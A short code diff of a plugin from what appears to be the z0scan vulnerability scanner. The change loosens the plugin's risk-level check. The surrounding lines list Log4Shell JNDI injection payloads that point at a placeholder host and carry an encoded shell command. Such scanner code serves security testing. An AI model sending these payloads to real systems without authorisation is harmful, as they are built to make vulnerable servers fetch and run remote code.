@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+# JiuZero/z0scan
 
 from api import generateResponse, VulType, Type, PluginBase, conf, Threads
 import re
@@ -11,7 +12,7 @@ class Z0SCAN(PluginBase):
     risk = 3
 
     def audit(self):
-        if (not self.fingerprints.waf) and (self.risk in conf.risk) and (conf.level != 0):
+        if (not self.fingerprints.waf) and (conf.level != 0):
             _payloads = [
                 "${jndi:ldap://z0scan-test.xxx.com:1389/Basic/Command/Base64/dG91Y2ggL3RtcC96MHNjYW4x}",
                 "${jndi:rmi://z0scan-test.xxx.com:1099/z0scan2}",
